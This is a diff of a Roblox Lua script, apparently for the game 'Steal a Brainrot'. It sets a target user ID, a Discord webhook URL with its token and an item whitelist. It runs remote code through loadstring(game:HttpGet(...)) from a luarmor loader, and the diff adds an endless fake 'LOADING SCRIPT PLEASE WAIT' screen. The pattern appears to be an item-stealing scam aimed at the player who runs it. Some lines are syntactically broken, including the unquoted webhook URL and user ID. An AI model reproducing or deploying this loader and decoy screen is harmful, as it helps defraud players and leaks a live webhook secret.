@@ -1,5 +1,5 @@
 getgenv().targetUserId = rzgr1ks
-getgenv().webhookURL = "https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F"
+getgenv().webhookURL = https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F
 getgenv().whitelistBrainrot = {
     ["Skibidi Toilet"] = true,
     ["Dragon Cannelloni"] = true,
@@ -11,44 +11,111 @@ getgenv().whitelistBrainrot = {
 }
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f8227db06cefdc7b56ea6a3e7d4272de.lua"))()
---[=[
- d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
-88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
-88      88    88    88            odD'      88      88    88 88ooo88 
-88  ooo 88    88    88          .88'        88      88    88 88~~~88 
-88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
- Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
-]=]
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
--- Instances: 3 | Scripts: 0 | Modules: 0 | Tags: 0
-local G2L = {};
+-- Global state so it persists across deaths
+local progress = 0
+local isWaiting = false
 
--- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
-G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+-- Ensure PlayerGui exists
+local playerGui = player:WaitForChild("PlayerGui")
 
+-- Create or get existing UI
+local function getLoadingUI()
+    local gui = playerGui:FindFirstChild("IntroLoadingGui")
+    if gui then
+        local frame = gui:WaitForChild("LoadingFrame")
+        return {
+            Gui = gui,
+            Bar = frame:WaitForChild("LoadingBarBackground"):WaitForChild("LoadingBar"),
+            Title = frame:WaitForChild("LoadingTitle")
+        }
+    end
 
--- StarterGui.ScreenGui.Frame
-G2L["2"] = Instance.new("Frame", G2L["1"]);
-G2L["2"]["BorderSizePixel"] = 0;
-G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2"]["Size"] = UDim2.new(0, 309, 0, 254);
-G2L["2"]["Position"] = UDim2.new(0.2968, 0, 0.23864, 0);
-G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+    -- Create new GUI
+    local LoadingGui = Instance.new("ScreenGui")
+    LoadingGui.Name = "IntroLoadingGui"
+    LoadingGui.Parent = playerGui
+    LoadingGui.DisplayOrder = 999
+    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
+    local LoadingFrame = Instance.new("Frame")
+    LoadingFrame.Name = "LoadingFrame"
+    LoadingFrame.Parent = LoadingGui
+    LoadingFrame.Size = UDim2.new(0, 300, 0, 150)
+    LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    LoadingFrame.BorderSizePixel = 4
+    LoadingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
 
--- StarterGui.ScreenGui.TextLabel
-G2L["3"] = Instance.new("TextLabel", G2L["1"]);
-G2L["3"]["BorderSizePixel"] = 0;
-G2L["3"]["TextSize"] = 14;
-G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3"]["Size"] = UDim2.new(0, 200, 0, 50);
-G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3"]["Text"] = [[loading]];
-G2L["3"]["Position"] = UDim2.new(0.3633, 0, 0.40422, 0);
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 16)
+    UICorner.Parent = LoadingFrame
 
+    local LoadingTitle = Instance.new("TextLabel")
+    LoadingTitle.Name = "LoadingTitle"
+    LoadingTitle.Parent = LoadingFrame
+    LoadingTitle.Size = UDim2.new(1, -20, 0.5, 0)
+    LoadingTitle.Position = UDim2.new(0, 10, 0, 10)
+    LoadingTitle.BackgroundTransparency = 1
+    LoadingTitle.Text = "LOADING SCRIPT PLEASE WAIT..."
+    LoadingTitle.Font = Enum.Font.SourceSansBold
+    LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LoadingTitle.TextScaled = true
 
+    local LoadingBarBackground = Instance.new("Frame")
+    LoadingBarBackground.Name = "LoadingBarBackground"
+    LoadingBarBackground.Parent = LoadingFrame
+    LoadingBarBackground.Size = UDim2.new(0.8, 0, 0.1, 0)
+    LoadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
+    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 
-return G2L["1"], require;
+    local LoadingBar = Instance.new("Frame")
+    LoadingBar.Name = "LoadingBar"
+    LoadingBar.Parent = LoadingBarBackground
+    LoadingBar.Size = UDim2.new(progress / 100, 0, 1, 0)
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    return {Gui = LoadingGui, Bar = LoadingBar, Title = LoadingTitle}
+end
+
+local ui = getLoadingUI()
+
+-- Function to run loading continuously
+local function runLoading()
+    spawn(function()
+        while true do
+            if not isWaiting then
+                for i = progress + 1, 100 do
+                    progress = i
+                    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
+                    task.wait(60 / 100) -- 1 minute total
+                end
+
+                -- Wait 1 minute at 100%
+                isWaiting = true
+                ui.Title.Text = "LOADING COMPLETE PLEASE WAIT"
+                task.wait(60)
+                isWaiting = false
+
+                -- Reset progress
+                progress = 0
+                ui.Bar.Size = UDim2.new(0, 0, 1, 0)
+                ui.Title.Text = "LOADING SCRIPT PLEASE WAIT..."
+            else
+                task.wait(1)
+            end
+        end
+    end)
+end
+
+-- Ensure UI persists on respawn
+player.CharacterAdded:Connect(function()
+    ui = getLoadingUI()
+    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
+end)
+
+-- Start the loading loop
+runLoading()
